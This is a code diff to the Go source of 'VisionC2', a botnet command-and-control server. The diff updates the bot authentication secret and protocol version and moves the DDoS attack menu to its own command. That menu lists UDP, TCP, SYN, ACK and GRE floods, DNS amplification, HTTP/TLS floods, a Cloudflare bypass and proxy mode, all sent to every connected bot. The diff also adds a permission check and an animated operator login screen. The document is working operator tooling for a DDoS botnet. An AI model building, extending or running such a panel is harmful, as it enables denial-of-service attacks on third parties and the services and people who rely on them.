@@ -30,8 +30,8 @@ const (
 	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "oDU92ei#0OZqRueu"
-	PROTOCOL_VERSION = "proto55"
+	MAGIC_CODE       = "IhxWZGJDzdSviX$s"
+	PROTOCOL_VERSION = "r5.6-stable"
 )
 
 type BotConnection struct {
@@ -636,10 +636,9 @@ func (c *client) canTargetSpecificBot() bool {
 func (c *client) showHelpMenu(conn net.Conn) {
 	c.writeHeader(conn) // Top border with user level
 
-	// All authenticated users see general and attack commands
+	// All authenticated users see general commands
 	if c.canUseDDoS() {
 		c.writeGeneralCommands(conn)
-		c.writeAttackCommands(conn)
 	}
 
 	// Admin+ sees shell commands
@@ -665,6 +664,36 @@ func (c *client) showHelpMenu(conn net.Conn) {
 	c.writeFooter(conn) // Bottom border
 }
 
+// showAttackMenu displays all available attack methods
+// Separate from main help to save screen space
+func (c *client) showAttackMenu(conn net.Conn) {
+	conn.Write([]byte("\r\n"))
+	conn.Write([]byte("\033[1;97m╔══════════════════════════════════════════════════════════════╗\r\n"))
+	conn.Write([]byte("\033[1;97m║              \033[1;31m☠ VisionC2 Attack Methods ☠\033[1;97m                   ║\r\n"))
+	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
+	conn.Write([]byte("\033[1;97m║  \033[1;33mLayer 4 (Network)\033[1;97m                                         ║\r\n"))
+	conn.Write([]byte("\033[1;97m║    !udpflood  <ip> <port> <time>  - UDP flood                ║\r\n"))
+	conn.Write([]byte("\033[1;97m║    !tcpflood  <ip> <port> <time>  - TCP flood                ║\r\n"))
+	conn.Write([]byte("\033[1;97m║    !syn       <ip> <port> <time>  - SYN flood                ║\r\n"))
+	conn.Write([]byte("\033[1;97m║    !ack       <ip> <port> <time>  - ACK flood                ║\r\n"))
+	conn.Write([]byte("\033[1;97m║    !gre       <ip> <port> <time>  - GRE flood                ║\r\n"))
+	conn.Write([]byte("\033[1;97m║    !dns       <ip> <port> <time>  - DNS amplification        ║\r\n"))
+	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
+	conn.Write([]byte("\033[1;97m║  \033[1;35mLayer 7 (Application)\033[1;97m                                      ║\r\n"))
+	conn.Write([]byte("\033[1;97m║    !http      <url> <port> <time> - HTTP GET/POST flood      ║\r\n"))
+	conn.Write([]byte("\033[1;97m║    !https     <url> <port> <time> - HTTPS/TLS flood          ║\r\n"))
+	conn.Write([]byte("\033[1;97m║    !tls       <url> <port> <time> - TLS flood (alias)        ║\r\n"))
+	conn.Write([]byte("\033[1;97m║    !cfbypass  <url> <port> <time> - Cloudflare bypass        ║\r\n"))
+	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
+	conn.Write([]byte("\033[1;97m║  \033[1;36mControl\033[1;97m                                                    ║\r\n"))
+	conn.Write([]byte("\033[1;97m║    !stop                          - Stop all attacks         ║\r\n"))
+	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
+	conn.Write([]byte("\033[1;97m║  \033[1;32mProxy Mode (L7 only)\033[1;97m - Add at end: -p <proxy_url.txt>     ║\r\n"))
+	conn.Write([]byte("\033[1;97m║    Example: !http site.com 443 60 -p http://x.com/proxy.txt  ║\r\n"))
+	conn.Write([]byte("\033[1;97m╚══════════════════════════════════════════════════════════════╝\r\n"))
+	conn.Write([]byte("\033[0m\r\n"))
+}
+
 func (c *client) writeHeader(conn net.Conn) {
 	conn.Write([]byte("\r\n"))
 	conn.Write([]byte("\033[1;97m╔══════════════════════════════════════════════════════════════╗\r\n"))
@@ -677,38 +706,15 @@ func (c *client) writeHeader(conn net.Conn) {
 // These are non-destructive informational commands
 func (c *client) writeGeneralCommands(conn net.Conn) {
 	commands := []string{
-		"║  \033[1;32mGeneral Commands\033[1;97m                        ║",
+		"║  \033[1;32mGeneral Commands\033[1;97m                                           ║",
 		"║    bots           - List all connected bots                  ║",
 		"║    clear/cls      - Clear screen                             ║",
 		"║    banner         - Show banner                              ║",
-		"║    help/?         - Show this help menu                      ║",
+		"║    help           - Show this help menu                      ║",
 		"║    ongoing        - Show ongoing attacks                     ║",
 		"║    logout/exit    - Disconnect from C2                       ║",
-	}
-	c.writeSection(conn, commands)
-}
-
-// writeAttackCommands outputs the DDoS attack methods available
-// Covers Layer 4 (UDP, TCP, SYN, ACK, GRE) and Layer 7 (HTTP, HTTPS, TLS)
-// Also documents proxy mode for L7 attacks to route through proxies
-// Commands broadcast to ALL connected bots simultaneously
-func (c *client) writeAttackCommands(conn net.Conn) {
-	commands := []string{
-		"║  \033[1;31mAttack Commands\033[1;97m (sent to ALL bots)                        ║",
-		"║    !udpflood  <ip/url> <port> <time>  - UDP flood            ║",
-		"║    !tcpflood  <ip/url> <port> <time>  - TCP flood            ║",
-		"║    !http      <ip/url> <port> <time>  - HTTP GET/POST flood  ║",
-		"║    !https     <ip/url> <port> <time>  - HTTPS/TLS flood      ║",
-		"║    !tls       <ip/url> <port> <time>  - TLS flood (alias)    ║",
-		"║    !cfbypass  <ip/url> <port> <time>  - Cloudflare bypass    ║",
-		"║    !syn       <ip/url> <port> <time>  - SYN flood            ║",
-		"║    !ack       <ip/url> <port> <time>  - ACK flood            ║",
-		"║    !gre       <ip/url> <port> <time>  - GRE flood            ║",
-		"║    !dns       <ip/url> <port> <time>  - DNS amplification    ║",
-		"║    !stop                              - Stop all attacks     ║",
-		"║                                                              ║",
-		"║  \033[1;35mProxy Mode (L7 only)\033[1;97m: Add -p <proxy_url.txt> at the end   ║",
-		"║    Example: !http site.com 443 60 -p http://x.com/proxy.txt  ║",
+		"║  \033[1;31mAttack Commands\033[1;97m                                            ║",
+		"║    attack/methods - Show all attack methods                  ║",
 	}
 	c.writeSection(conn, commands)
 }
@@ -1088,25 +1094,89 @@ func showBanner(conn net.Conn) {
 // On success, creates client struct and adds to active clients list
 // Returns (true, client) on success, (false, nil) on failure
 func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {
+
 	for i := 0; i < 3; i++ { // 3 attempts max
-		conn.Write([]byte("\033[0m"))                      // Reset colors
-		conn.Write([]byte("\r\n\r\n\r\n\r\n\r\n\r\n\r\n")) // Spacing
-		conn.Write([]byte("\r                        \033[38;5;109m► Auth\033[38;5;146ment\033[38;5;182micat\033[38;5;218mion -- \033[38;5;196mReq\033[38;5;161muir\033[38;5;89med\n"))
-		conn.Write([]byte("\033[0m\r                       ☉ Username\033[38;5;62m: "))
+		conn.Write([]byte("\033[2J\033[H")) // Clear screen
+		conn.Write([]byte("\033[0m"))       // Reset colors
+
+		// Animated loading effect
+		loadingFrames := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
+		for j := 0; j < 10; j++ {
+			conn.Write([]byte(fmt.Sprintf("\033[H\033[38;5;196m\r                    %s Initializing secure connection...\033[0m", loadingFrames[j%len(loadingFrames)])))
+			time.Sleep(80 * time.Millisecond)
+		}
+
+		conn.Write([]byte("\033[2J\033[H")) // Clear screen
+		// Stylized eye
+		conn.Write([]byte("\033[38;5;93m                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;99m                      ▄█▀▀             ▀▀█▄\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;105m                    ▄█▀   \033[38;5;196m▄▄▄▄▄▄▄▄▄\033[38;5;105m   ▀█▄\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;111m                   █▀   \033[38;5;196m█▀\033[38;5;231m██████\033[38;5;196m▀█\033[38;5;111m   ▀█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;117m                  █▌   \033[38;5;196m█\033[38;5;231m████\033[38;5;196m◉\033[38;5;231m████\033[38;5;196m█\033[38;5;117m   ▐█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;111m                   █▄   \033[38;5;196m█▄\033[38;5;231m██████\033[38;5;196m▄█\033[38;5;111m   ▄█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;105m                    ▀█▄   \033[38;5;196m▀▀▀▀▀▀▀▀▀\033[38;5;105m   ▄█▀\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;99m                      ▀█▄▄             ▄▄█▀\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;93m                         ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[0m\r\n"))
+		conn.Write([]byte("\r\n"))
+
+		// Login box
+		conn.Write([]byte("\033[38;5;240m           \033[38;5;245m     Unauthorized attemps are logged    \033[38;5;240m│\033[0m\r\n"))
+		conn.Write([]byte("\r\n"))
+
+		// Attempt counter
+		if i > 0 {
+			conn.Write([]byte(fmt.Sprintf("\033[38;5;196m                    ⚠ Login attempt %d of 3 - Access denied\033[0m\r\n\r\n", i)))
+		}
+
+		// Username prompt with blinking cursor effect
+		conn.Write([]byte("\033[38;5;240m           ╭──────────────────────────────────────╮\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;240m           │ \033[38;5;46m◈\033[38;5;231m Username \033[38;5;240m│\033[0m "))
+
 		username, err := getFromConnReader(reader)
 		if err != nil {
 			return false, nil
 		}
-		// Password uses white text on white background (invisible typing)
-		conn.Write([]byte("\033[0m\r                       ☉ Password\033[38;5;62m: \033[38;5;255m\033[48;5;255m"))
+
+		conn.Write([]byte("\033[38;5;240m           │ \033[38;5;196m◈\033[38;5;231m Password \033[38;5;240m│\033[38;5;0m\033[48;5;0m "))
+
 		password, err := getFromConnReader(reader)
 		if err != nil {
 			return false, nil
 		}
-		conn.Write([]byte("\033[0m"))        // Reset after hidden password
-		conn.Write([]byte("\033[2J\033[3J")) // Clear screen
+
+		conn.Write([]byte("\033[0m"))
+		conn.Write([]byte("\033[38;5;240m           ╰──────────────────────────────────────╯\033[0m\r\n"))
+
+		// Authentication animation
+		conn.Write([]byte("\r\n"))
+		authFrames := []string{
+			"           \033[38;5;226m[■□□□□□□□□□]\033[38;5;245m Verifying credentials...\033[0m",
+			"           \033[38;5;226m[■■□□□□□□□□]\033[38;5;245m Checking database...\033[0m",
+			"           \033[38;5;226m[■■■□□□□□□□]\033[38;5;245m Validating access level...\033[0m",
+			"           \033[38;5;226m[■■■■□□□□□□]\033[38;5;245m Authenticating...\033[0m",
+			"           \033[38;5;226m[■■■■■□□□□□]\033[38;5;245m Decrypting session...\033[0m",
+			"           \033[38;5;226m[■■■■■■□□□□]\033[38;5;245m Establishing tunnel...\033[0m",
+			"           \033[38;5;226m[■■■■■■■□□□]\033[38;5;245m Loading profile...\033[0m",
+			"           \033[38;5;226m[■■■■■■■■□□]\033[38;5;245m Initializing session...\033[0m",
+			"           \033[38;5;226m[■■■■■■■■■□]\033[38;5;245m Finalizing...\033[0m",
+			"           \033[38;5;226m[■■■■■■■■■■]\033[38;5;245m Complete!\033[0m",
+		}
+		for _, frame := range authFrames {
+			conn.Write([]byte(fmt.Sprintf("\r%s", frame)))
+			time.Sleep(100 * time.Millisecond)
+		}
+		conn.Write([]byte("\r\n"))
 
 		if exists, user := AuthUser(username, password); exists {
+			// Success animation
+			conn.Write([]byte("\r\n"))
+			conn.Write([]byte("\033[38;5;46m           ╔═══════════════════════════════════════════╗\033[0m\r\n"))
+			conn.Write([]byte("\033[38;5;46m           ║   ✓ ACCESS GRANTED - WELCOME TO VISION   ║\033[0m\r\n"))
+			conn.Write([]byte("\033[38;5;46m           ╚═══════════════════════════════════════════╝\033[0m\r\n"))
+			time.Sleep(800 * time.Millisecond)
+
+			conn.Write([]byte("\033[2J\033[H")) // Clear screen
+
 			loggedClient := &client{
 				conn: conn,
 				user: *user,
@@ -1114,7 +1184,24 @@ func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {
 			clients = append(clients, loggedClient)
 			return true, loggedClient
 		}
+
+		// Failed animation
+		conn.Write([]byte("\r\n"))
+		conn.Write([]byte("\033[38;5;196m           ╔═══════════════════════════════════════════╗\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;196m           ║   ✗ ACCESS DENIED - INVALID CREDENTIALS  ║\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;196m           ╚═══════════════════════════════════════════╝\033[0m\r\n"))
+		time.Sleep(1500 * time.Millisecond)
 	}
+
+	// Final lockout message
+	conn.Write([]byte("\033[2J\033[H"))
+	conn.Write([]byte("\r\n\r\n\r\n"))
+	conn.Write([]byte("\033[38;5;196m           ╔═══════════════════════════════════════════╗\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;196m           ║      ☠ ACCOUNT LOCKED - TOO MANY ATTEMPTS ☠     ║\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;196m           ║         Your IP has been logged.          ║\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;196m           ╚═══════════════════════════════════════════╝\033[0m\r\n"))
+	time.Sleep(2 * time.Second)
+
 	conn.Close()
 	return false, nil
 }
@@ -1465,6 +1552,13 @@ func handleRequest(conn net.Conn) {
 
 				case "help":
 					c.showHelpMenu(conn)
+
+				case "attack", "attacks", "methods":
+					if !c.canUseDDoS() {
+						conn.Write([]byte("\033[1;31m❌ Permission denied: Attack commands require at least Basic level\r\n\033[0m"))
+						continue
+					}
+					c.showAttackMenu(conn)
 				case "db":
 					if !c.canUsePrivate() {
 						conn.Write([]byte("\033[1;31m❌ Permission denied: Database access requires Owner level\r\n\033[0m"))
@@ -1535,7 +1629,7 @@ func handleRequest(conn net.Conn) {
 
 					conn.Write([]byte("\033[1;36m═══════════════════════════════════════════════════\r\n\033[0m"))
 				case "?":
-					conn.Write([]byte("\033[1;33mType 'help' for full command list\r\n\033[0m"))
+					conn.Write([]byte("\033[1;33m'help' - commands  |  'attack' - attack methods\r\n\033[0m"))
 
 				case "private":
 					if !c.canUsePrivate() {
